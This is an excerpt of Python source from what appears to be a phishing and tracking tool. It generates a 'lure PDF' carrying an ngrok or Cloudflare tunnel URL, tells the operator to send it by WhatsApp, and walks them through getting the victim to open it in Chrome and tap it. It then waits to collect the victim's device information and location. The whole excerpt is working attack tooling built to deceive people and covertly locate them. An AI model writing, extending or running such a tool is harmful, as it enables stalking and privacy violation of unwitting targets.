...
parser.add_argument(
    '--pdf', help='Path to PDF file - generates lure PDF for WhatsApp sharing'
)
parser.add_argument(
    '--pdf-url',
    help='Public HTTPS URL to embed in lure PDF (ngrok / cloudflare tunnel)',
)
...
pdf_file = getenv('PDF') or args.pdf
pdf_url = getenv('PDF_URL') or args.pdf_url

if pdf_file:
    environ['PDF_PATH'] = pdf_file
    environ['PDF_AUTO'] = '1'
    if not getenv('PDF_TITLE'):
        environ['PDF_TITLE'] = path.basename(pdf_file)
...
if pdf_file and templateNum is None:
    with open(f'{path.dirname(path.realpath(__file__))}/template/templates.json', 'r') as templ:
        templ_json = loads(templ.read())
    for idx, item in enumerate(templ_json['templates']):
        if item['import_file'] == 'mod_pdf':
            templateNum = idx
            environ['TEMPLATE'] = str(idx)
            break
...
def pdf_lure_generate():
    if pdf_file is None:
        return
    print()
    utils.print(f'{Y}[!] {C}PDF Mode - Server is running on port {W}{port}')
    utils.print(
        f'{Y}[!] {C}Start a tunnel, e.g. : {W}ngrok http {port}'
    )
    if pdf_url:
        url = pdf_url.strip()
    else:
        url = input(
            f'{G}[+] {C}Enter Public HTTPS URL (ngrok / cloudflare) : {W}'
        ).strip()
    if not url:
        utils.print(f'{R}[-] {C}URL is required to embed in the PDF{W}')
        return
    from template.mod_pdf import create_lure_pdf

    output_dir = f'{path_to_script}/output'
    if not path.isdir(output_dir):
        mkdir(output_dir)
    out_name = path.basename(pdf_file)
    out_path = f'{output_dir}/{out_name}'
    try:
        create_lure_pdf(pdf_file, out_path, url)
    except Exception as exc:
        utils.print(f'{R}[-] {C}Failed to create lure PDF : {W}{exc}')
        return
    utils.print(f'{G}[+] {C}Lure PDF created :{W} {out_path}')
    try:
        test = requests.get(url, timeout=10, headers={'ngrok-skip-browser-warning': '1'})
        if test.status_code == 200:
            utils.print(f'{G}[+] {C}Server URL is reachable :{W} {url}')
        else:
            utils.print(
                f'{Y}[!] {C}Server returned status {W}{test.status_code}{C} - check ngrok{W}'
            )
    except requests.RequestException as exc:
        utils.print(f'{R}[-] {C}Cannot reach URL : {W}{exc}')
        utils.print(
            f'{Y}[!] {C}Make sure ngrok is running : {W}ngrok http {port}{W}'
        )
    utils.print(f'{G}[+] {C}Send {W}{out_path} {C}via WhatsApp.{W}')
    utils.print(f'{Y}[!] {C}On phone:{W}')
    utils.print(f'{Y}    1.{W} Open PDF in WhatsApp')
    utils.print(f'{Y}    2.{W} Tap menu (⋮) → Open with → Chrome')
    utils.print(f'{Y}    3.{W} Tap anywhere on the document page')
    utils.print(
        f'{Y}[!] {C}Test first: open {W}{url} {C}in phone Chrome{W}\n'
    )
...
def wait():
    ...
    while True:
        sleep(2)
        result_size = path.getsize(RESULT)
        info_size = path.getsize(INFO) if path.exists(INFO) else 0
        if result_size == 0 and info_size == 0 and printed is False:
            utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
            printed = True
        if result_size > 0 or info_size > 0:
            data_parser()
            printed = False
...
"""
            ...
            utils.print(
                f'{Y}[!] {C}Device info received. Waiting for location...{W}\n'
            )
            with open(INFO, 'w+'):
                pass
            return
